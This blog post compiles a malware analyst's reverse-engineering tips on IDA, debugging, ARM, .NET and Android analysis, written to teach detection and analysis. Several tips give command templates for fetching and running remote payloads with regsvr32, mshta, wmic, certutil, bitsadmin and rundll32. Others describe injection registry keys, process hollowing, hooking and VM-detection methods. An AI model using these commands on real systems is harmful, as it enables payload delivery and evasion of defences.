---
title: "Compilation of RE tip of the day by Alexey Kleymenov"
date: "2020-12-15"
layout: single
tags:
- RE
categories:
- Notes
---

Alexey Kleymenov posts "tips of the day" from time to time on Twitter, and I made this note to compile his tips for my reference in future. Alexey is a malware analyst and a software engineer with 12+ years of practical RE experience in several international antivirus companies. He also is author of the "Mastering Malware Analysis" book.

1. Need to debug samples with snapshots on the cloud instance or old hardware not supporting virtualization? Emulate it! [link](https://github.com/alexey-kleymenov/reverse_engineering_tools/blob/master/re_howto/debug_malware_on_cloud_machine_with_qemu.md)
2. What are some of the common ways to manually unpack samples?
    * Monitor allocation of big memory blocks
    * Track the stack alignment
    * Keep an eye on big embedded high-entropy blocks 
3. Debugging kernel-mode samples remotely using IDA+WinDbg but need to restore a VM snapshot? You can save existing IDA markdown as IDC, reconnect to the restored state of VM and load it back!    
4. Need to install and use both IDA 5-6 and 7 on one machine? It is possible: [link](https://github.com/alexey-kleymenov/reverse_engineering_tools/blob/master/ida_howto/how_to_use_both_ida5-6_and_ida7_on_one_machine.md)  
5. Less known ways how Windows malware can access the remote payload using standard console commands: 
    * `regsvr32 /s /n /u /i:<url_to_sct> scrobj.dll`
    * `mshta <url_to_hta>`
    * `wmic os get /FORMAT:<url_to_xsl>`
6. Can malware execute VBScript or JScript code as a single-line command like PowerShell to remain fileless? Yes, it can!
    * `mshta vbscript:<script_body>`
    * `mshta javascript:<script_body>`
7. A great compilation of various ways how attackers can bypass UAC in malware: [link](https://github.com/hfiref0x/UACME)
8. Some of the quick ways to find the encryption: 
    * Search for standard constants (`FindCrypt` can help)
    * Search for `xor` instructions
    * Check crypto WinAPIs in **strings** and **imports**
    * Track downloaded and embedded high-entropy blocks
9. Need to decrypt a list of strings in IDA? Check out these easily extendible templates supporting both versions 5-6 and 7+! [link](https://github.com/PacktPublishing/Mastering-Malware-Analysis/tree/master/Chapter03)
10. How to deduce the attackers' origin?
    * check code pages in resources
    * aggregate timestamps (unless obviously forged) and deduce the timezone
    * search for dev strings(like PDB path)
    * match against known IoCs
11. A useful project for analyzing Go modules in IDA: [link](https://github.com/sibears/IDAGolangHelper)
12. How malware is generally implemented as a service:
    * independent executable
    * DLL with its own loader (like rundll32.exe)
    * shared service DLL loaded by `svchost.exe`
13. When working with the memory dump, the import table may already have APIs' addresses. To get the actual API names, try `pe_dlls.idc` script from the `pe_scripts.zip` available on the Hex-Rays website to load DLLs
14. Before `curl`, system tools like `bitsadmin` and `certutil` became misused to download payloads:
    * `bitsadmin /transfer <any_name> /download /priority normal <url> <dest>`
    * `certutil -urlcache -split -f <url> <dest>`
15. A great project summarizing the ways how standard tools can be misused by attackers: [LOLBAS](https://lolbas-project.github.io)
16. Encountered a sample or a shellcode that dynamically resolve WinAPIs by hashes? Try out this IDA script! [link](https://github.com/alexey-kleymenov/reverse_engineering_tools/tree/master/ida_scripts)
17. The visual mode doesn't work as expected on radare2? Don't forget to analyze the sample using the `aaa` command first!
18. When analyzing Visual Basic samples, first check whether they are compiled in Native or P-code mode. Now you know whether you need a usual disassembler or a Visual Basic bytecode disassembler/decompiler.
19. Not very well-known fact: PowerShell commands can be truncated as long as they remain unambiguous (for example, `-encodedcommand` and `-encod` are treated the same way) - a property often used by malware authors.
20. Your favourite .NET debugger fails when processing a heavily obfuscated .NET sample? Try to decompile it using ildasm tool and then assemble it back using `ilasm` with the `/debug` flag!
21. Need to debug a VBScript sample? Start it with `cscript //X //D <script>` and choose the debugger of preference, for example, Visual Studio (needs to be already installed)
22. Need to debug an office macro? Microsoft Office already has an embedded debugger for it! Just open the macro there and explore the Debug menu (always make sure you use a safe environment like a VM)
23. Need to apply a structure to a local variable in IDA?
    1) Right-click on it, choose `Manual...` and name it there ("Check operand option" will verify it)
    2) Select variable text, right-click on it and use the "Structure offset"
24. Decompiling Python code generated by PyInstaller? Add missing header bytes from any python module compiled on your system first!
25. Need to change the size of multiple values in IDA? Use the D key to get the right size for the first one, then select the whole block with it, choose `Array...` option and unselect Use "`dup`" construct and Create as array ticks!
26.  How to debug injected code?
        1) Stop where it was just injected, attach to the victim process, put a breakpoint at it and run
        2) Patch the payload with EB FE bytes, run it, attach to the victim process and restore orig bytes
27.  To quickly search for binary differences in samples, check out an amazing VBinDiff tool!
28.  Did you know that new versions of radare2 support tabs in Visual mode? Now you can quickly switch between hex dump and disassembly in the same console!
29. Looking for alternatives to OllyDbg, PETools and ImpRec for 64-bit Windows? Try x64dbg, VSD and CHimpREC (or Scylla) respectively!
30. There are multiple ways malware can detect VMs including:
    1) custom hardware labels and MAC addresses
    2) unique registry keys and files
    3) certain helper software running on the VM
    4) custom output of CPUID and IN instructions
31.  Analyzing the same file simultaneously with other engineers on IDA? Check out these collaboration plugins!
        * IDArling
        * collabREate
        * YaCo
32. For quick MSDN annotations for WinAPIs on IDA, idb2pat plugin to generate FLIRT signatures and multiple other handy tools, check out https://github.com/fireeye/flare-ida project!
33. Looking for a console disassembler/hex editor? Check out Hiew. To integrate it with Far Manager, specify it in `F9`->`Options`->`Editor settings (<path_to_hiew> "!.!")`. Now you can peek into any file with `Alt+F4`!
34. Need to analyze Android malware? For native code, static analysis can be done using any disassembler supporting ARM ISA!
35. Need to analyze Android malware? For DEX bytecode, except for ready solutions like JADX, you can convert it to JAR (for example, with dex2jar) and decompile it like usual Java bytecode (for example, using Krakatau or Procyon)! 
36. Need to analyze Android malware? Start from the `AndroidManifest.xml`, checking `android.intent.action.MAIN` as well as the Application subclass in the `android:name` attribute of the `<application>` elements first!
37. When analyzing a memory dump in IDA, it is possible to convert import addresses populated by the loader to names by loading DLLs from that system using `pe_dlls.idc` script from the `pe_scripts.zip` package!
38. In IDA, when loading a C header file with definitions as enums, use a standard IDA `h2enum.idc` script. Put a correct mask in the second dialog window and in the C file prepend definitions with `#pragma pack(1)`
39. To rename multiple consequent values pointing to the actual WinAPIs in the import table in IDA, select all of them and execute a standard `renimp.idc` script (can be found in IDA's idc directory)
40. There are 16 registers visible at any time on the 32-bit ARM: R0-R15 (4 bits to define it). 13 (may be referred as 14 with R14, or 15 with R13) are GPR: R13 and R15 have a special purpose and R14 may have it
41. 32-bit ARM registers:
        - R0-R7: Low registers
        - R8-R12: High registers
        - R13 (aka SP): Stack pointer
        - R14 (aka LR): Link register (contains function return address)
        - R15 (aka PC): Program counter CPSR, SPSR, APSR...
42. 64-bit ARMv8 has 31 general-purpose registers: X0-X30 (R0-R30). The lower part of each register has the W prefix and can be accessed as W0-W30. X29 may store a frame pointer and X30 - function return address
43. Special-purpose registers on ARMv8 (64-bit):
        - `XZR/WZR`: Zero register
        - `PC`: Program counter
        - `SP/WSP`: Stack pointer
        - `ELR`: Exception link register
        - `SPSR`: Saved processor state register
44. Usual rundll32.exe can be misused by the attackers to execute arbitrary JS code, for example to download and execute the payload: ```rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";<script_body>```
45. Need to mark static library code in IDA (like OpenSSL)? Create a FLIRT sig!
    1) Get a `.lib/.a` file for it
    2) Get Flair tools
    3) `pcf <lib>.a <lib>.pat`
    4) `sigmake <lib>.pat <lib>.sig`
    5) Place .sig file to sig directory
    6) Apply it
46. To debug a Win sample in IDA, it should have an executable file extension (like .exe). Old IDA doesn't have the Local debugger option for x64. Use Remote debugger option with win64_remotex64.exe server tool from dbgsrv folder.
47.  In OllyDbg, you can list all recognized strings using `<right click> -> Search for -> All referenced text strings`. In order to find all WinAPIs used, use `<right click> > Search for -> All intermodular calls`
48. In order to recognize RC4 algorithm in a sample, search for xor instructions with different registers as arguments (or a register and a memory address)  and check for the key initialization logic before it. 
49. In IDA, the graph view is available only for recognized functions. Use Space key to switch between text and graph views. When debugging starts, if mini graph disappears, restore it by selecting View -> Graph Overview
50. Looking for public sources of malware samples for R&D purposes? Wrapped present Check out this ultimate compilation list available to all cybersecurity specialists: https://pcapanalysis.com/download-malware-samples/
51. Need to debug a sample for a less common architecture (MIPS, SH4, PowerPC or SPARC)? Use qemu-user to emulate it on your favorite platform! Run a GDB server there to connect to it using any supported debugger
52. To run a GDB server with qemu-user, use -g option and the port number, for example, for ARM:
```
qemu-arm -g 1337 ./sample.arm
Now, to connect to it with radare2:
r2 -a arm -b 32 -d gdb://127.0.0.1:1337
```
53. When emulating a dynamically linked ARM sample, install ARM dependencies libc6-armhf-cross (armel for ARM older than 7), and provide its path `/usr/arm-linux-gnueabihf (..gnueabi)` with `-L` or via `QEMU_LD_PREFIX`
54. When using qemu-user to emulate a sample when running a GDB server, use the following commands on the gdb client (`gdb-multiarch` is recommended):
```
target remote 127.0.0.1:<chosen_port>
file <path_to_executable>
```
55. IDA can be used with qemu-user to debug samples for different platforms via GDB server using the Remote GDB debugger.
56. There are several instruction sets available for ARM processors: ARM and Thumb (and similar ThumbEE). ARM CPUs always start in the ARM state, then a program can switch to the Thumb state using BX instruction
57. ARM accesses syscalls using Software Interrupt (SWI) instruction, later renamed to Supervisor Call (SVC). The syntax for it is the following: `SVC{cond} #imm` where Condition codes {cond} look like EQ, NE, etc
58.  Looking for a smart tool to dump new or terminating processes? Try https://github.com/glmcdona/Process-Dump:
        - `db gen` - generate a db of clean processes
        - `closemon` - dump terminating processes
        - `system` - dump non-clean modules
59. Why would we need hardware breakpoints over software ones (`INT 3 = 0xCC`) even though there are only 4 of them? They are harder to detect and they won't damage your memory dump or a decrypted block!
60. Some ways how malware can detect hardware breakpoints: 
	1) by saving its thread context and accessing DR registers there 
	2) from the CONTEXT structure accessible from the custom SEH routine
62. In IDA, the analysis can be rerun either in `Options -> General... -> Analysis -> Reanalyze` program or by right-clicking in the lower-left corner of the main IDA window and selecting "`Reanalyze program`" option
63. When analyzing a malicious DLL, if `DllRegisterServer, DllUnregisterServer` or `DllInstall` exports are present, it might be the COM DLL - in this case try to use regsvr32.exe instead of rundll32.exe to load it!
64. When debugging DLLs using `rundll32.exe`, provide the export function name or a hash sign with its ordinal (like #1) after the DLL path and comma. It needs to be done even when analyzing only the `DllMain`.
65.  A Control Panel DLL (usually can be recognized by the CPlApplet export function) can also be loaded using the following syntax: ``rundll32.exe shell32.dll,Control_RunDLL <path_to_dll><args_if_any>``
66. When loading COM DLLs with `regsvr32.exe`, use `/u` argument to call `DllUnregisterServer` export function. To call DllInstall function, a combination of `/n /i[:<optional_cmdline>]` arguments may be used instead
67. funcap plugin for IDA allows you to automatically record all the arguments passed to functions while the sample is executed. A perfect way to quickly get as much decrypted data (like C&Cs) as possible!
68. If after decryption malware stores code and data in another memory segment outside the main memory dump, dump and add them separately to the IDB using the `File | Load File | Additional binary file`... option
69. When adding a binary file to the IDB, set the Loading segment value to 0 and specify the base Virtual Address in the Loading offset. Or, change the associated selector to 0 in `View | Open subviews | Selectors`
70. If the sample resolves WinAPIs dynamically by their hash values, in IDA it is handy to store the mappings "`hash->name`" in enums. Using comments is less flexible as it becomes more difficult to maintain them. https://twitter.com/re_and_more/status/1321074297994055681?s=20
71. To inject a DLL, attackers can use `HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\AppInit_DLLs` key. It is disabled by default on modern versions of Windows, can be enabled using `LoadAppInit_DLLs` key
72. Another way how attackers may inject a DLL into processes that use `CreateProcess*` and WinExec APIs is by adding it to the `HKLM\SYSTEM\CurrentControlSet\Control\SessionManager\AppCertDlls` registry key
73. Classic process injections involve memory allocation or mapping in the victim's address space, writing information there (a DLL name or the actual code) and making sure the corresponding code gets executed
74. Common APIs used in process injections:
    1. Memory alloc/map - `VirtualAllocEx, NtCreateSection`
    2. Write code/data - `WriteProcessMemory, NtMapViewOfSection`
    3. Execution - `CreateRemoteThread, SetThreadContext, QueueUserAPC`
75. Process hollowing, a variation of process injection, is an act of creating a suspended process, unmapping its memory and replacing it with the malicious code, mainly to avoid detection by security products
76. In process injections, memory allocation/mapping is not obligatory. Attackers can parse the PEB structure, get the base address of the victim process and overwrite its code. Example: https://ired.team/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx
77. It is recommended to debug the process injection code when it is already written but not yet executed, in this case the analyst may benefit from the correct context that will help understand the functionality
78. It is common to search for injected blocks of code by memory range permissions used (READ, WRITE and EXECUTE). Multiple tools like standalone injdmp heavily rely on this principle
79. Basic API hooking involves replacing API's standard mov edi,edi; push ebp; mov ebp, esp prologue with a jmp instruction pointing to the hooking function changing API's arguments before returning control back
80. Inline hooking with a trampoline allows modifying both API's input and output. A trampoline is called by a hooking function. It contains the original API's instructions and returns the control back to the API
81. Because the 'call' instruction is used to go from the hooking function to the trampoline, once the API reaches its own 'ret', the control will go back to the hooking function allowing it to change the output. https://twitter.com/re_and_more/status/1330088731844489220?s=20
82. If the API's prologue is different from "`mov edi,edi;push ebp;mov ebp, esp`", malware can use a length disassembler to find the number of instructions to copy to the trampoline before replacing them with 'jmp'
83. When a length disassembler is used to analyze the API's prologue, some instructions (like `jmp shor`t) need to be avoided as they are position-dependent and won't work correctly once copied to another location
84. IAT (import address table) hooking is another form of API hooking where the attackers modify the import table's addresses so that they point to the malicious hooking functions rather than the actual APIs. https://twitter.com/re_and_more/status/1332263118072901639?s=20
85. Each .NET sample in addition to PE header has a special COR20 header located in the .text section containing various fields like the runtime version, the information about resources and entry point details
86. In .NET files, there are 5 metadata streams: #~ (all details of internal objects used), #Strings (all strings used by #~), #US (strings used by the app),  #GUID (all GUIDs used), #blob (all app's binary data)
87. If your favorite .NET decompiler fails, it is possible to read the CIL bytecode! The official documentation (ECMA-335, Partition III) may be quite heavy, here is a concise alternative: https://en.wikipedia.org/wiki/List_of_CIL_instructions
88. .NET bytecode: 
```
if (X == 50) {
   Y = 20;
}
```
```
0: ldloc.0 //push var 0 (X) to stack
1: ldc.i4.s 50 //push 50 to stack
2: bne 5 //if not equal, branch to line #5
3: ldc.i4.s 20 //push 20 to stack
4: stloc.1 //pop it to var 1 (Y)
```
89.  The format of `EntryPointToken` in the COR20 header of malware explained: `0x06000012` means the entry point is located in the 6th table (Method) of the 0th stream (#~) in the 0x12 (18th) method (see screenshot) https://twitter.com/re_and_more/status/1336611716621332481?s=20
90.  When analyzing .NET malware, try dnSpy tool - it has both bytecode disassembler and decompiler and supports debugging as well. de4dot is another great tool to detect and bypass various obfuscation methods
91.  In dnSpy, to start the analysis, use right click -> "Go to Entry Point" to find the main function. Also, pay attention to the forms' constructors (.ctor) and functions like `OnStartup, OnRun, OnCreateMainForm`
